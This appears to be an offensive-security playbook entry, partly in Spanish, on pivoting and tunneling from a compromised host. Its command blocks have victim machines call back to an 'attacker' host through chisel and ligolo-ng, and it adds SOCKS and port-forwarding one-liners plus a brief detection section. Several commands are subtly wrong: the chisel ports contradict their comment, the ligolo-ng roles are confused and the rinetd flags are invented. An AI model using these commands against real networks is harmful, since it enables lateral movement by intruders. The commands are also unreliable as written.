---
title: Pivoting and Tunneling
phase: post-explotacion
platform: linux, windows
tags: [pivot, tunnel, socks, port-forward, proxy]
risk: high
attack_tactic: TA0008
attack_technique: T1570
data_sources: [network-traffic, firewall-logs, ssh-logs]
last_review: 2026-05-25
---

# Pivoting and Tunneling

### Objetivo

Usar una máquina comprometida como hop para acceder a redes internas inalcanzables directamente.

### Chisel (HTTP tunneling)

```bash
# Attacker (listen on port 1080)
./chisel server -p 8080 --reverse

# Victim (connect back)
./chisel client attacker:8080 R:31337:127.0.0.1:31337
# Local port 1080 becomes a SOCKS proxy to victim network
```

### SSHuttle

```bash
# VPN-like over SSH
sshuttle -r user@Pivot 10.10.10.0/24 -N

# Direct port forward
ssh -L 1080:target:port user@pivot
```

### Ligolo-ng (TUN interface replacement for VPN)

```bash
# Attacker
./ligolo-ng_agent -session //attacker:55555
./ligolo-ng_listener -port 31337

# Victim
./agent.exe -connect attacker:55555 -reverse
# Add route on attacker: sudo ip route add 10.10.10.0/24 dev tunnel0
```

### socat

```bash
# Port forward relay
socat TCP-LISTEN:8080,fork TCP:internal:80

# Relay with SSL
socat OPENSSL-LISTEN:443,fork TCP:10.10.10.5:443
```

### Proxychains

```bash
# Add entries to /etc/proxychains4.conf
socks4 127.0.0.1 1080

# Use via proxychains
proxychains nmap -sT -p 80 10.10.10.5
```

### One-liners

```bash
# Plink (Windows SSH tunnel)
plink.exe -L 8080:127.0.0.1:80 user@pivot

# Dynamic port forward (SOCKS)
ssh -D 1080 user@pivot

# Rinetd (simple port redirect)
rinetd -l 0.0.0.0 8080 -r 10.10.10.5 80
```

### Detección y Mitigación

- **Visibilidad:** Monitor for unusual outbound connections from workstations, sudden new listening ports, anomalous SSH sessions.
- **Hardening:** Restringir outgoing connections from endpoints, monitor portforwarding tools, network segmentation.

### Validación de Cobertura

- **Prueba técnica:** Deploy chisel in lab and pivot to internal subnet.
- **Criterio de éxito:** Firewall alert on outbound tunnel or new port binding on workstation.
